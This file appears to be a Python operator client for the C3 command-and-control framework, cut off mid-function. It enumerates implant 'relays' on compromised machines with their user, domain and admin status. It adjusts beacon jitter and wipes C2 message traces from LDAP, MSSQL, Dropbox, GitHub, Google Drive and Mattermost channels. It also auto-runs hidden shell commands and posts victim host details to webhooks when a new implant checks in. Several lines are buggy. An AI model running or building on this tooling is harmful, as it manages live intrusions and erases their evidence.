#!/usr/bin/python3

import os
import sys
import io
import re
import time
import json
import requests
import subprocess
import argparse
import random
import string
import zipfile
from datetime import datetime 


config = {
    'verbose' : False,  
    'debug' : False,
    'host' : '',
    'dry_run' : False,
    'command' : '',
    'format' : 'text',
    'httpauth' : '',
}

commands = {
    'list' : [
        'gateways',
        'relays'
    ],
    'get' : [
        'gateway',
        'relay'
    ]
}

serverValidated = False

# BackendCommons.h: enum class Command : std::uint16_t
commandsMap = {
    'AddDevice' : 0,
    'Close' : 2**16 - 1,
    'UpdateJitter' : 2**16 - 2,
    'CreateRoute' : 2**16 - 3,
    'RemoveRoute' : 2**16 - 4,
    'SetGRC' : 2**16 - 5,
    'Ping' : 2**16 - 6,
    'ClearNetwork' : 2**16 - 7,
}

headers = {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
}

class Logger:
    @staticmethod
    def _out(x): 
        if config['debug'] or config['verbose']: 
            sys.stdout.write(x + '\n')

    @staticmethod
    def dbg(x):
        if config['debug']: 
            sys.stdout.write('[dbg] ' + x + '\n')

    @staticmethod
    def out(x): 
        Logger._out('[.] ' + x)
    
    @staticmethod
    def info(x):
        Logger._out('[?] ' + x)
    
    @staticmethod
    def err(x): 
        sys.stdout.write('[!] ' + x + '\n')
    
    @staticmethod
    def fatal(x): 
        sys.stdout.write('[!] ' + x + '\n')
        sys.exit(1)
    
    @staticmethod
    def fail(x):
        Logger._out('[-] ' + x)
    
    @staticmethod
    def ok(x):  
        Logger._out('[+] ' + x)

def printJson(data):
    print(json.dumps(data, sort_keys=True, indent=4))

def getRequest(url, rawResp = False, stream = False):
    global serverValidated

    auth = None
    if config['httpauth']:
        user, _pass = config['httpauth'].split(':')
        Logger.dbg(f'HTTP Basic Auth: {user}:{_pass}')
        auth = requests.HTTPDigestAuth(user, _pass)

    fullurl = config["host"] + url
    Logger.info(f'GET Request: {fullurl}')

    try:
        resp = requests.get(fullurl, headers=headers, auth=auth, stream = stream, timeout = 5)

        if not serverValidated:
            try:
                gateways = requests.get(config["host"] + '/api/gateway', headers=headers, auth=auth, stream = stream, timeout = 5)
                if gateways.status_code < 200 or gateways.status_code > 300:
                    raise Exception()

                serverValidated = True
            except:
                Logger.fatal('Server could not be validated. Are you sure your Host value points to a valid C3 webcontroller URL?')

    except requests.exceptions.ConnectTimeout as e:
        Logger.fatal(f'Connection with {config["host"]} timed-out.')
    except Exception as e:
        Logger.fatal(f'GET request failed ({url}): {e}')

    Logger.dbg(f'First 512 bytes of response:\n{resp.text[:512]}')

    if rawResp:
        return resp

    try:
        ret = resp.json()
    except:
        ret = resp.text

    return ret

def postRequest(url, data=None, contentType = 'application/json', rawResp = False):
    auth = None
    if config['httpauth']:
        user, _pass = config['httpauth'].split(':')
        Logger.dbg(f'HTTP Basic Auth: {user}:{_pass}')
        auth = requests.HTTPDigestAuth(user, _pass)

    fullurl = config["host"] + url
    Logger.info(f'POST Request: {fullurl}')

    resp = None

    if config['dry_run']:
        print(f'[?] Dry-run mode: Skipping post request ({url})')
        if rawResp:
            class MockResponse():
                def __init__(self, status_code, text):
                    self.status_code = status_code
                    self.text = text

            return MockResponse(201, '')
        else:
            return ''

    if contentType.endswith('/json'):
        resp = requests.post(fullurl, json=data, headers=headers, auth=auth)
    else:
        resp = requests.post(fullurl, data=data, headers=headers, auth=auth)

    if rawResp:
        return resp

    try:
        ret = resp.json()
    except:
        ret = resp.text

    return ret

def printFullGateway(gatewayId):
    gateway = getRequest(f'/api/gateway/{gatewayId}')

    if type(gateway) == str and re.match(r'Gateway with id = \w+ not found', gateway, re.I):
        Logger.err(f'Gateway with ID {gatewayId} was not found.')
        if config['format'] == 'json': print('{}')
        sys.exit(1)

    if config['format'] == 'json':
        printJson(gateway)
    else:
        printGatewayText(gateway)
        indent = '    '

        print()

        print(f'{indent}Connectors:')
        num = 0
        cnum = 0
        for c in gateway['connectors']:
            cnum += 1
            addr = ''
            port = ''

            for d in c['propertiesText']['arguments']:
                if d['type'] == 'ip': 
                    addr = d['value']
                elif d['type'] == 'uint16': 
                    port = d['value']

            print(f'{indent}    Connector ID:   {c["iid"]}')
            print(f'{indent}    Host:           {addr}:{port}\n')

        num = 0
        print(f'{indent}Channels:')
        for c in gateway['channels']:
            num += 1
            kind = 'Channel'
            name = ''   # todo

            if 'isNegotiationChannel' in c.keys() and c['isNegotiationChannel']:
                kind = 'Negotiation Channel'

            if 'isReturnChannel' in c.keys() and c['isReturnChannel']:
                kind = 'Gateway Return Channel (GRC)'

            print(f'''{indent}{indent}{kind} {num}:\t{name}
{indent}{indent}    Jitter:      {' ... '.join([str(x) for x in c['jitter']])}
{indent}{indent}    Properties:''')

            for arg in c['propertiesText']['arguments']:
                if type(arg) == list or type(arg) == tuple:
                    for arg1 in arg:
                        print(f'''{indent}{indent}        Name:    {arg1['name']}
{indent}{indent}        Value:   {arg1['value']}
''')
                else:
                    print(f'''{indent}{indent}        Name:    {arg['name']}
{indent}{indent}        Value:   {arg['value']}
''')

        num = 0
        for g in gateway['relays']:
            num += 1
            alive = ''
            elevated = ''

            if g['isActive']:
                alive = '\t\t\t(+)'

            if g['hostInfo']['isElevated']:
                elevated = '\t\t\t(###)'

            print(f'''
{indent}Relay {num}:              {g['name']}
{indent}    Relay ID:         {g['agentId']}
{indent}    Build ID:         {g['buildId']}
{indent}    Is active:        {g['isActive']}{alive}
{indent}    Timestamp:        {datetime.fromtimestamp(g['timestamp'])}
{indent}    Host Info:  
{indent}        Computer:     {g['hostInfo']['computerName']}
{indent}        Domain:       {g['hostInfo']['domain']}
{indent}        User Name:    {g['hostInfo']['userName']}
{indent}        Is elevated:  {g['hostInfo']['isElevated']}{elevated}
{indent}        OS Version:   {g['hostInfo']['osVersion']}
{indent}        Process ID:   {g['hostInfo']['processId']}''')


def onGetGateway(args):
    gateways = getRequest('/api/gateway')
    for g in gateways:
        if args.name.lower() == g['name'].lower():
            print('\n== Relays connected to Gateway ' + g['name'] + ': ')
            printFullGateway(g['agentId'])
            return

    printFullGateway(args.name)

def printFullRelay(r, num = 0, indent='    '):
    alive = ''
    elevated = ''

    if r['isActive']:
        alive = '\t\t\t(+)'

    if r['hostInfo']['isElevated']:
        elevated = '\t\t\t(###)'

    print(f'''{indent}Relay {num}:              {r['name']}
{indent}    Relay ID:         {r['agentId']}
{indent}    Build ID:         {r['buildId']}
{indent}    Is active:        {r['isActive']}{alive}
{indent}    Timestamp:        {datetime.fromtimestamp(r['timestamp'])}
{indent}    Host Info:  
{indent}        Computer:     {r['hostInfo']['computerName']}
{indent}        Domain:       {r['hostInfo']['domain']}
{indent}        User Name:    {r['hostInfo']['userName']}
{indent}        Is elevated:  {r['hostInfo']['isElevated']}{elevated}
{indent}        OS Version:   {r['hostInfo']['osVersion']}
{indent}        Process ID:   {r['hostInfo']['processId']}
''')

    cnum = 0
    print(f'{indent}Channels:')
    for c in r['channels']:
        cnum += 1
        kind = 'Channel'
        name = ''   # todo

        if 'isNegotiationChannel' in c.keys() and c['isNegotiationChannel']:
            kind = 'Negotiation Channel'

        if 'isReturnChannel' in c.keys() and c['isReturnChannel']:
            kind = 'Gateway Return Channel (GRC)'

        print(f'''{indent}{indent}{kind} {cnum}:\t{name}
{indent}{indent}    Jitter:      {' ... '.join([str(x) for x in c['jitter']])}
{indent}{indent}    Properties:''')

        for arg in c['propertiesText']['arguments']:
            if type(arg) == list or type(arg) == tuple:
                for arg1 in arg:
                    print(f'''{indent}{indent}        Name:    {arg1['name']}
{indent}{indent}        Value:   {arg1['value']}
''')
            else:
                print(f'''{indent}{indent}        Name:    {arg['name']}
{indent}{indent}        Value:   {arg['value']}
''')

def onGetRelay(args):
    Logger.dbg('in onListRelays(): ' + str(args))

    relays = collectRelays(args)

    if len(relays) == 0:
        Logger.err('Could not find specified Relay given neither its name nor agentId.')
        if config['format'] == 'json': print('{}')
        sys.exit(1)

    num = 0
    if config['format'] == 'text':
        for gateway, relay in relays:
            num += 1
            printFullRelay(relay, num)

    elif config['format'] == 'json':
        printJson(relays)

def printGatewayText(g, num = 0):
    alive = ''
    if g['isActive']:
        alive = '\t\t\t(+)'
    print(f'''
Gateway {num}:\t{g['name']}
    Gateway ID: {g['agentId']}
    Build ID:   {g['buildId']}
    Is active:  {g['isActive']}{alive}
    Timestamp:  {datetime.fromtimestamp(g['timestamp'])}''')

def onListGateways(args):
    Logger.dbg('in onListGateways(): ' + str(args))
    gateways = getRequest('/api/gateway')
    
    if config['format'] == 'json':
        printJson(gateways)

    elif config['format'] == 'text':
        num = 0
        for g in gateways:
            num += 1
            if args.active:
                if not g['isActive']: continue

            printGatewayText(g, num)

def listGatewayRelays(gatewayId, indent = '', onlyActive = False):
    relays = getRequest(f'/api/gateway/{gatewayId}')

    if type(relays) == str and re.match(r'Gateway with id = \w+ not found', relays, re.I):
        Logger.err(f'Gateway with ID {gatewayId} was not found.')
        if config['format'] == 'json': print('{}')
        sys.exit(1)

    if config['format'] == 'json':
        printJson(relays['relays'])

    elif config['format'] == 'text':
        num = 0
        for g in relays['relays']:
            num += 1
            alive = ''
            elevated = ''

            if onlyActive:
                if not g['isActive']: continue

            if g['isActive']:
                alive = '\t\t\t(+)'

            if g['hostInfo']['isElevated']:
                elevated = '\t\t\t(###)'

            print(f'''
{indent}Relay {num}:\t{g['name']}
{indent}    Relay ID:   {g['agentId']}
{indent}    Build ID:   {g['buildId']}
{indent}    Is active:  {g['isActive']}{alive}
{indent}    Timestamp:  {datetime.fromtimestamp(g['timestamp'])}
{indent}    Host Info:  
{indent}        Computer:     {g['hostInfo']['computerName']}
{indent}        Domain:       {g['hostInfo']['domain']}
{indent}        User Name:    {g['hostInfo']['userName']}
{indent}        Is elevated:  {g['hostInfo']['isElevated']}
{indent}        OS Version:   {g['hostInfo']['osVersion']}
{indent}        Process ID:   {g['hostInfo']['processId']}''')

def onListRelays(args):
    Logger.dbg('in onListRelays(): ')

    if args.gateway_id != None:
        gateways = getRequest('/api/gateway')
        for g in gateways:
            if args.gateway_id == g['name'].lower():
                print('\n== Relays connected to Gateway ' + g['name'] + ': ')
                listGatewayRelays(g['agentId'], onlyActive = args.active)
                return

        listGatewayRelays(args.gateway_id, onlyActive = args.active)

    else:
        gateways = getRequest('/api/gateway')
        num = 0
        relays = {}
        relays['gateways'] = []
        for g in gateways:
            num += 1
            if config['format'] == 'text':
                print(f'''
Gateway {num}:\t{g['name']}''')
                listGatewayRelays(g['agentId'], indent = '    ', onlyActive = args.active)
            else:
                relaysData = getRequest(f'/api/gateway/{g["agentId"]}')
                g['relays'] = relaysData['relays']
                relays['gateways'].append(g)

        if config['format'] == 'json':
            printJson(relays)

def collectRelays(args, nonFatal = False):
    relays = []
    gateways = getRequest('/api/gateway')
    gateway_id = ''
    relay_id = ''

    if hasattr(args, 'gateway_id'):
        gateway_id = args.gateway_id
        Logger.info(f'Collecting relays from gateway {gateway_id}')

    if hasattr(args, 'relay_id'):
        relay_id = args.relay_id
        Logger.info(f'Collecting relays matching name/ID: {relay_id}')

    for _gateway in gateways:
        if len(gateway_id) > 0:
            if _gateway["agentId"].lower() != gateway_id.lower() and _gateway["name"].lower() != gateway_id.lower():
                continue

        gateway = getRequest(f'/api/gateway/{_gateway["agentId"]}')

        for relay in gateway['relays']:
            if len(relay_id) > 0:
                if relay["agentId"].lower() != relay_id.lower() and relay["name"].lower() != relay_id.lower():
                    continue

            relays.append((gateway, relay))

    if len(relays) == 0 and not nonFatal:
        Logger.fatal('Could not find Relays matching filter criteria. Try changing gateway, relay criteria.')

    return relays

def processCapability(gateway):
    caps = getRequest(f'/api/gateway/{gateway["agentId"]}/capability')
    
    commandIds = {}
    channels = {}
    peripherals = {}

    for gatewayVal in caps['gateway']:
        for commandVal in gatewayVal['commands']:
            commandIds[commandVal['name'].lower()] = commandVal['id']

            Logger.dbg(f'Gateway capability: commands: {commandVal["name"]} = {commandVal["id"]}')

    for channel in caps['channels']:
        channels[channel['name']] = channel['type']

    for peri in caps['peripherals']:
        peripherals[peri['name']] = peri['type']

    Logger.dbg('Gateway supports following channels: ' + str(', '.join(channels.keys())))
    Logger.dbg('Gateway supports following peripherals: ' + str(', '.join(peripherals.keys())))

    capability = {
        'raw' : caps, 
        'commandIds' : commandIds, 
        'channels' : channels, 
        'peripherals' : peripherals,
    }

    return capability
        
def getCommandIdMapping(gateway, command):
    capability = processCapability(gateway)

    return capability['commandIds'][command.lower()]

def onPing(args):
    try:
        if args.keep_pinging > 0:
            while True:
                print(f'[.] Sending a ping every {args.keep_pinging} seconds.')
                _onPing(args)
                time.sleep(args.keep_pinging)
        else:
            print('[.] Pinging only once...')
            _onPing(args)
    except KeyboardInterrupt as e:
        print('[.] User stopped Pinging process.')

def _onPing(args):
    relays = collectRelays(args)

    if len(relays) == 0:
        print('[-] No relays found that could be pinged.')
        return

    pinged = 0
    for gateway, relay in relays:
        Logger.info(f'Pinging relay {relay["name"]}...')
        data = {
            'name' : 'RelayCommandGroup',
            'data' : {
                'id' : commandsMap['Ping'],
                'name' : 'Command',
                'command' : 'Ping',
                'arguments' : []
            }
        }

        ret = postRequest(f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/command', data)

        if type(ret) == dict and 'relayAgentId' in ret.keys() and ret['relayAgentId'] == relay['agentId']:
            print(f'[.] Pinged relay: {relay["name"]} (id: {relay["agentId"]}) from gateway {gateway["name"]}')
            pinged += 1

    if pinged == 0:
        print('[-] There were no active relays that could be pinged.\n')
    else:
        print(f'[+] Pinged {pinged} active relays.\n')

def getLastGatewayCommandID():
    lastId = 0
    gateways = getRequest(f'/api/gateway')

    for gateway in gateways:
        commands = getRequest(f'/api/gateway/{gateway["agentId"]}/command')
        for comm in commands:
            if comm['id'] > lastId:
                lastId = comm['id']

    return lastId + 1

def onAllChannelsClear(args):
    channels = {
        'LDAP' : onLDAPClear,
        'MSSQL' : onMSSQLClearTable,
        'Mattermost' : onMattermostPurge,
        'GoogleDrive' : onGoogleDriveClear,
        'Github' : onGithubClear,
        'Dropbox' : onDropboxClear,
        'UncShareFile' : onUncShareFileClear,
    }

    for k, v in channels.items():
        print(f'\n[.] {k}: Clearing messages queue...')
        v(args)

def onMattermostPurge(args):
    data = {
        'data' : {
            'arguments' : [],
            'command' : 'Clear all channel messages',
            'id' : 0,
            'name' : 'Mattermost'
        },
        'name' : 'ChannelCommandGroup'
    }

    channels = collectChannels(args, 'mattermost')

    if len(channels) == 0:
        print('[-] No channels could be found to receive Mattermost purge command.')
        return

    for channel in channels:
        ret = postRequest(channel['url'], data)

        if type(ret) == dict and 'Clear all' in str(ret):
            if 'relay' in channel.keys():
                print(f'[+] Purged all messages from Mattermost C3 channel {channel["channelId"]} on Relay {channel["relay"]["name"]} on gateway {channel["gateway"]["name"]}')
            else:
                print(f'[+] Purged all messages from Mattermost C3 channel {channel["channelId"]} on gateway {channel["gateway"]["name"]}')

def onJitter(args):
    gateways = getRequest('/api/gateway')

    channelsToUpdate = []

    for _gateway in gateways:
        if len(args.gateway_id) > 0:
            if _gateway["agentId"].lower() != args.gateway_id.lower() and _gateway["name"].lower() != args.gateway_id.lower():
                continue

        gateway = getRequest(f'/api/gateway/{_gateway["agentId"]}')
        capability = processCapability(gateway)

        if len(args.relay_id) == 0:
            for channel in gateway['channels']:
                name = list(capability['channels'].keys())[list(capability['channels'].values()).index(channel['type'])]
                if len(args.channel_id) == 0 or (name.lower() == args.channel_id.lower() or channel['iid'] == args.channel_id):
                    channelsToUpdate.append({
                        'url' : f'/api/gateway/{_gateway["agentId"]}/channel/{channel["iid"]}/command',
                        'name' : name,
                        'iid' : channel['iid'],
                        'agent' : gateway,
                        'kind' : 'Gateway',
                    })

        for relay in gateway['relays']:
            if len(args.relay_id) > 0:
                if relay["agentId"].lower() != args.relay_id.lower() and relay["name"].lower() != args.relay_id.lower():
                    continue

            for channel in relay['channels']:
                name = list(capability['channels'].keys())[list(capability['channels'].values()).index(channel['type'])]
                if len(args.channel_id) == 0 or (name.lower() == args.channel_id.lower() or channel['iid'] == args.channel_id):
                    channelsToUpdate.append({
                        'url' : f'/api/gateway/{_gateway["agentId"]}/relay/{relay["agentId"]}/channel/{channel["iid"]}/command',
                        'name' : name,
                        'iid' : channel['iid'],
                        'agent' : relay,
                        'kind' : 'Relay',
                    })

    if len(channelsToUpdate) == 0:
        Logger.fatal('Could not find channels that should have their Jitter updated. Try changing search criteria.')

    for channel in channelsToUpdate:
        data = {
            "name" : "ChannelCommandGroup",
            "data" : {
                "id" : commandsMap['UpdateJitter'],
                "name" : channel['name'],
                "command" : "Set UpdateDelayJitter",
                "arguments" : [
                    {
                        "type" : "float",
                        "name" : "Min",
                        "value" : str(args.min_jitter)
                    },
                    {
                        "type" : "float",
                        "name" : "Max",
                        "value" : str(args.max_jitter)
                    }
                ]
            }
        }

        Logger.info(f'Updating Jitter on channel {channel["name"]} (id: {channel["iid"]}) running on {channel["kind"]} {channel["agent"]["name"]} (id: {channel["agent"]["agentId"]}) to {args.min_jitter}...{args.max_jitter}')
        ret = postRequest(channel['url'], data = data, rawResp = True)

        if ret.status_code == 201:
            print(f'[+] Channel {channel["name"]} (id: {channel["iid"]}) running on {channel["kind"]} {channel["agent"]["name"]} (id: {channel["agent"]["agentId"]}) got its Jitter updated to {args.min_jitter}...{args.max_jitter}\n')
            
def onLDAPClear(args):
    data = {
        'data' : {
            'arguments' : [],
            'command' : 'Clear attribute values',
            'id' : 0,
            'name' : 'LDAP'
        },
        'name' : 'ChannelCommandGroup'
    }

    channels = collectChannels(args, 'ldap')

    if len(channels) == 0:
        print('[-] No channels could be found to receive LDAP clear attribute command.')
        return

    for channel in channels:
        ret = postRequest(channel['url'], data)

        if type(ret) == dict and 'LDAP' in str(ret):
            if 'relay' in channel.keys():
                print(f'[+] Cleared LDAP attribute value on C3 channel {channel["channelId"]} on Relay {channel["relay"]["name"]} on gateway {channel["gateway"]["name"]}')
            else:
                print(f'[+] Cleared LDAP attribute value on C3 channel {channel["channelId"]} on gateway {channel["gateway"]["name"]}')

def onMSSQLClearTable(args):
    data = {
        'data' : {
            'arguments' : [],
            'command' : 'Clear DB Table',
            'id' : 0,
            'name' : 'MSSQL'
        },
        'name' : 'ChannelCommandGroup'
    }

    channels = collectChannels(args, 'mssql')

    if len(channels) == 0:
        print('[-] No channels could be found to receive MSSQL clear DB table command.')
        return

    for channel in channels:
        ret = postRequest(channel['url'], data)

        if type(ret) == dict and 'MSSQL' in str(ret):
            if 'relay' in channel.keys():
                print(f'[+] Cleared MSSQL Table on C3 channel {channel["channelId"]} on Relay {channel["relay"]["name"]} on gateway {channel["gateway"]["name"]}')
            else:
                print(f'[+] Cleared MSSQL Table value on C3 channel {channel["channelId"]} on gateway {channel["gateway"]["name"]}')

def onUncShareFileClear(args):
    data = {
        'data' : {
            'arguments' : [],
            'command' : 'Remove all message files',
            'id' : 0,
            'name' : 'UncShareFile'
        },
        'name' : 'ChannelCommandGroup'
    }

    channels = collectChannels(args, 'uncsharefile')

    if len(channels) == 0:
        print('[-] No channels could be found to receive UncShareFile remove all message files command.')
        return

    for channel in channels:
        ret = postRequest(channel['url'], data)

        if type(ret) == dict and 'UncShareFile' in str(ret):
            if 'relay' in channel.keys():
                print(f'[+] Cleared UncShareFile message files on C3 channel {channel["channelId"]} on Relay {channel["relay"]["name"]} on gateway {channel["gateway"]["name"]}')
            else:
                print(f'[+] Cleared UncShareFile message files on C3 channel {channel["channelId"]} on gateway {channel["gateway"]["name"]}')

def onDropboxClear(args):
    data = {
        'data' : {
            'arguments' : [],
            'command' : 'Remove All Files',
            'id' : 1,
            'name' : 'Dropbox'
        },
        'name' : 'ChannelCommandGroup'
    }

    channels = collectChannels(args, 'dropbox')

    if len(channels) == 0:
        print('[-] No channels could be found to receive Dropbox remove all message files command.')
        return

    for channel in channels:
        ret = postRequest(channel['url'], data)

        if type(ret) == dict and 'Dropbox' in str(ret):
            if 'relay' in channel.keys():
                print(f'[+] Cleared Dropbox message files on C3 channel {channel["channelId"]} on Relay {channel["relay"]["name"]} on gateway {channel["gateway"]["name"]}')
            else:
                print(f'[+] Cleared Dropbox message files on C3 channel {channel["channelId"]} on gateway {channel["gateway"]["name"]}')

def onGithubClear(args):
    data = {
        'data' : {
            'arguments' : [],
            'command' : 'Remove All Files',
            'id' : 1,
            'name' : 'Github'
        },
        'name' : 'ChannelCommandGroup'
    }

    channels = collectChannels(args, 'github')

    if len(channels) == 0:
        print('[-] No channels could be found to receive Github remove all message files command.')
        return

    for channel in channels:
        ret = postRequest(channel['url'], data)

        if type(ret) == dict and 'Github' in str(ret):
            if 'relay' in channel.keys():
                print(f'[+] Cleared Github message files on C3 channel {channel["channelId"]} on Relay {channel["relay"]["name"]} on gateway {channel["gateway"]["name"]}')
            else:
                print(f'[+] Cleared Github message files on C3 channel {channel["channelId"]} on gateway {channel["gateway"]["name"]}')

def onGoogleDriveClear(args):
    data = {
        'data' : {
            'arguments' : [],
            'command' : 'Remove All Files',
            'id' : 1,
            'name' : 'GoogleDrive'
        },
        'name' : 'ChannelCommandGroup'
    }

    channels = collectChannels(args, 'googledrive')

    if len(channels) == 0:
        print('[-] No channels could be found to receive GoogleDrive remove all message files command.')
        return

    for channel in channels:
        ret = postRequest(channel['url'], data)

        if type(ret) == dict and 'GoogleDrive' in str(ret):
            if 'relay' in channel.keys():
                print(f'[+] Cleared GoogleDrive message files on C3 channel {channel["channelId"]} on Relay {channel["relay"]["name"]} on gateway {channel["gateway"]["name"]}')
            else:
                print(f'[+] Cleared GoogleDrive message files on C3 channel {channel["channelId"]} on gateway {channel["gateway"]["name"]}')

def getDeviceName(gateway, devicesType, deviceType):
    capability = processCapability(gateway)
    name = list(capability[devicesType].keys())[list(capability[devicesType].values()).index(deviceType)]

    return name

def collectChannels(args, channelName):
    channels = []
    gateways = getRequest('/api/gateway')
    gateway_id = ''
    relay_id = ''
    channel_id = ''

    if hasattr(args, 'gateway_id'):
        gateway_id = args.gateway_id
        Logger.info(f'Collecting relays from gateway {gateway_id}')

    if hasattr(args, 'relay_id'):
        relay_id = args.relay_id
        Logger.info(f'Collecting relays matching name/ID: {relay_id}')

    if hasattr(args, 'channel_id'):
        channel_id = args.channel_id
        Logger.info(f'Collecting channels matching name/ID: {channel_id}')

    for _gateway in gateways:
        if len(gateway_id) > 0:
            if _gateway["agentId"].lower() != gateway_id.lower() and _gateway["name"].lower() != gateway_id.lower():
                continue

        gateway = getRequest(f'/api/gateway/{_gateway["agentId"]}')

        for channel in gateway['channels']:
            if len(channel_id) > 0:
                if channel["iid"].lower() != channel_id.lower():
                    continue

            name = getDeviceName(gateway, 'channels', channel['type'])

            if name.lower() != channelName.lower():
                continue

            Logger.dbg(f'Adding channel {channel["iid"]} in Gateway {gateway["name"]}.')
            channels.append({
                'url' : f'/api/gateway/{gateway["agentId"]}/channel/{channel["iid"]}/command',
                'gateway' : gateway,
                'channelId' : channel['iid'],
            })

        for relay in gateway['relays']:
            if len(relay_id) > 0:
                if relay["agentId"].lower() != relay_id.lower() and relay["name"].lower() != relay_id.lower():
                    continue

            if 'channels' in relay.keys():
                for channel in relay['channels']:
                    if len(channel_id) > 0:
                        if channel["iid"].lower() != channel_id.lower():
                            continue

                    name = getDeviceName(gateway, 'channels', channel['type'])

                    if name.lower() != channelName.lower():
                        continue

                    Logger.dbg(f'Adding channel {channel["iid"]} in Relay {relay["name"]}.')
                    channels.append({
                        'url' : f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/channel/{channel["iid"]}/command',
                        'gateway' : gateway,
                        'relay' : relay,
                        'channelId' : channel['iid'],
                    })

    return channels

def shell(cmd, alternative = False, stdErrToStdout = False, surpressStderr = False):
    CREATE_NO_WINDOW = 0x08000000
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE

    outs = ''
    errs = ''
    if not alternative:
        out = subprocess.run(
            cmd, 
            cwd = os.getcwd(),
            shell=True, 
            capture_output=True, 
            startupinfo=si, 
            creationflags=CREATE_NO_WINDOW,
            timeout=60
            )

        outs = out.stdout
        errs = out.stderr
    else:
        proc = subprocess.Popen(
            cmd,
            cwd = cwd,
            shell=True, 
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            startupinfo=si, 
            creationflags=CREATE_NO_WINDOW
        )
        try:
            outs, errs = proc.communicate(timeout=60)
            proc.wait()

        except TimeoutExpired:
            proc.kill()
            logger.err('WARNING! The command timed-out! Results may be incomplete')
            outs, errs = proc.communicate()

    status = outs.decode(errors='ignore').strip()
    return status

def onAlarmRelay(args):
    origRelays = collectRelays(args, nonFatal = True)
    lastTimestamp = 0

    origRelayIds = set()

    for gateway, relay in origRelays:
        origRelayIds.add(relay['agentId'])
        if relay['timestamp'] > lastTimestamp:
            lastTimestamp = relay['timestamp']

    print('[.] Entering infinite-loop awaiting for new Relays...')

    try:
        while True:
            time.sleep(args.delay)

            currRelays = collectRelays(args, nonFatal = True)
            currRelayIds = set()
            currLastTimestamp = 0

            for gateway, relay in currRelays:
                currRelayIds.add(relay['agentId'])
                if relay['timestamp'] > currLastTimestamp:
                    currLastTimestamp = relay['timestamp']

            relaysDiff = currRelayIds.difference(origRelayIds)

            Logger.dbg(f'''Alarm loop.
origRelayIds:       {origRelayIds}
currRelayIds:       {currRelayIds}
lengths:            {len(origRelayIds)} vs {len(currRelayIds)}
relaysDiff:         {relaysDiff}
lastTimestamp:      {lastTimestamp}
currLastTimestamp:  {currLastTimestamp}
New Relay?          {currLastTimestamp > lastTimestamp and len(relaysDiff) > 0}
''')

            if currLastTimestamp > lastTimestamp and len(relaysDiff) > 0:
                lastTimestamp = currLastTimestamp
                origRelayIds = currRelayIds

                newestRelay = None
                newestRelayGateway = None
                newestRelayId = relaysDiff.pop()

                for gateway, relay in currRelays:
                    if relay['agentId'] == newestRelayId:
                        newestRelay = relay
                        newestRelayGateway = gateway
                        break

                if newestRelay == None:
                    continue

                print('[+] New Relay checked-in!')
                printFullRelay(newestRelay, len(currRelays))

                try:
                    if args.execute != None and len(args.execute) > 0:
                        for command in args.execute:
                            cmd = command
                            cmd = cmd.replace("<computerName>", newestRelay['hostInfo']['computerName'])
                            cmd = cmd.replace("<isElevated>", str(newestRelay['hostInfo']['isElevated']))
                            cmd = cmd.replace("<osVersion>", newestRelay['hostInfo']['osVersion'])
                            cmd = cmd.replace("<domain>", newestRelay['hostInfo']['domain'])
                            cmd = cmd.replace("<userName>", newestRelay['hostInfo']['userName'])
                            cmd = cmd.replace("<processId>", str(newestRelay['hostInfo']['processId']))
                            cmd = cmd.replace("<relayName>", newestRelay['name'])
                            cmd = cmd.replace("<relayId>", newestRelay['agentId'])
                            cmd = cmd.replace("<buildId>", newestRelay['buildId'])
                            cmd = cmd.replace("<timestamp>", str(datetime.fromtimestamp(newestRelay['timestamp'])))
                            cmd = cmd.replace("<gatewayId>", newestRelayGateway['agentId'])
                            cmd = cmd.replace("<gatewayName>", newestRelayGateway['name'])

                            print(f'[.] Executing command: {cmd}')

                            time.sleep(args.command_delay)
                            print(shell(cmd))

                        print('[.] Commands executed.')

                    if args.webhook != None and len(args.webhook) > 0:
                        for webhook in args.webhook:
                            data = {
                                "<computerName>", newestRelay['hostInfo']['computerName'],
                                "<isElevated>", newestRelay['hostInfo']['isElevated'],
                                "<osVersion>", newestRelay['hostInfo']['osVersion'],
                                "<domain>", newestRelay['hostInfo']['domain'],
                                "<userName>", newestRelay['hostInfo']['userName'],
                                "<processId>", newestRelay['hostInfo']['processId'],
                                "<relayName>", newestRelay['name'],
                                "<relayId>", newestRelay['agentId'],
                                "<buildId>", newestRelay['buildId'],
                                "<timestamp>", datetime.fromtimestamp(newestRelay['timestamp']),
                                "<gatewayId>", newestRelayGateway['agentId'],
                                "<gatewayName>", newestRelayGateway['name'],
                            }

                            print(f'[.] Triggering a webhook: {webhook}')

                            try:
                                time.sleep(args.command_delay)
                                requests.post(webhook, data = data, headers = headears)
                            except Exception as e:
                                print(f'[-] Webhook failed: {e}')

                        print('[.] Webhooks triggered.')

                except Exception as e:
                    print(f'[-] Exception occured during New-Relay alarm trigger: {e}')
    
    except KeyboardInterrupt:
        print('[.] New Relay alarm loop was finished.')


def findAgent(agentId):
    gateways = getRequest('/api/gateway')

    for g in gateways:
        if g["agentId"].lower() == agentId.lower() or g["name"].lower() == agentId.lower():
            return g, None

        gateway = getRequest(f'/api/gateway/{g["agentId"]}')
        if 'relays' in gateway.keys():
            for r in gateway['relays']:
                if r["agentId"].lower() == agentId.lower() or r["name"].lower() == agentId.lower():
                    return g, r

    Logger.fatal('Could not find specified agent.')
    return None

def getValueOrRandom(val, N = 6):
    if val == 'random':
        return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(N))
    
    return val

def closeRelay(gateway, relay):
    gateway = getRequest(f'/api/gateway/{gateway["agentId"]}')
    relayMeta = getRequest(f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}')

    print('\n[.] step 1: Closing bound Peripherals')
    for peri in relayMeta['peripherals']:
        name = getDeviceName(gateway, 'peripherals', peri['type'])
        Logger.info(f'Closing relay\'s peripheral {name} id:{peri["iid"]}')
        closePeripheral(gateway, relay, name, peri['iid'])

    print('\n[.] step 2: Closing attached channels')
    grcChannel = None

    for chan in relayMeta['channels']:
        if 'isReturnChannel' in chan.keys():
            chan['url'] = f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/channel/{chan["iid"]}/command'
            grcChannel = chan
            continue

        chanName = getDeviceName(gateway, 'channels', chan['type'])
        Logger.info(f'Closing relay\'s channel {chanName} id:{chan["iid"]}')

